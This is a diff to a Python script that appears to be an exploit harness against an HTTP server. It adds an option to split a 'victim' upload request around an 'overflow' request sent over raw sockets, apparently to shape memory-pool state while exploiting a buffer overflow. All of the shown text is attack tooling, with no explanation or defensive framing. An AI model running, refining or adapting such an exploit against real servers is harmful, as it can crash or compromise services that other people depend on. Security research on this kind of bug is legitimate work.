@@ -105,6 +105,7 @@ def attempt(
     target_bytes,
     body,
     upload_victim=False,
+    delay_victim_body=False,
     victim_body_len=65536,
     a_count=DEFAULT_A_COUNT,
     plus_count=DEFAULT_PLUS_COUNT,
@@ -162,18 +163,28 @@ def attempt(
 
     if upload_victim:
         victim_body = b"V" * victim_body_len
-        v.sendall(
+        victim_headers = (
             b"POST /victim_upload HTTP/1.1\r\n"
             b"Host:localhost\r\n"
             b"X-Delay:60\r\n"
             b"Content-Length: " + str(len(victim_body)).encode() + b"\r\n"
             b"Connection: close\r\n"
-            b"\r\n" + victim_body
+            b"\r\n"
         )
+        if delay_victim_body:
+            v.sendall(victim_headers)
+        else:
+            v.sendall(victim_headers + victim_body)
     else:
         v.sendall(b"GET / HTTP/1.1\r\nHost:localhost\r\n")
     time.sleep(0.05)
     a.sendall(b"X-Delay:60\r\nConnection:close\r\n\r\n")
+    if upload_victim and delay_victim_body:
+        time.sleep(0.05)
+        try:
+            v.sendall(victim_body)
+        except (ConnectionResetError, BrokenPipeError, OSError):
+            pass
     time.sleep(0.2)
 
     v.close()
@@ -245,6 +256,8 @@ def main():
                         help=f"literal plus run length (default: {DEFAULT_PLUS_COUNT})")
     parser.add_argument("--upload-victim", action="store_true",
                         help="use a large upload victim request with a real pool cleanup")
+    parser.add_argument("--delay-victim-body", action="store_true",
+                        help="send victim upload headers before the overflow and body after it")
     parser.add_argument("--victim-body-len", type=int, default=65536,
                         help="body length for --upload-victim (default: 65536)")
     args = parser.parse_args()
@@ -320,6 +333,7 @@ def main():
                 target,
                 body,
                 upload_victim=args.upload_victim,
+                delay_victim_body=args.delay_victim_body,
                 victim_body_len=args.victim_body_len,
                 a_count=args.a_count,
                 plus_count=args.plus_count,
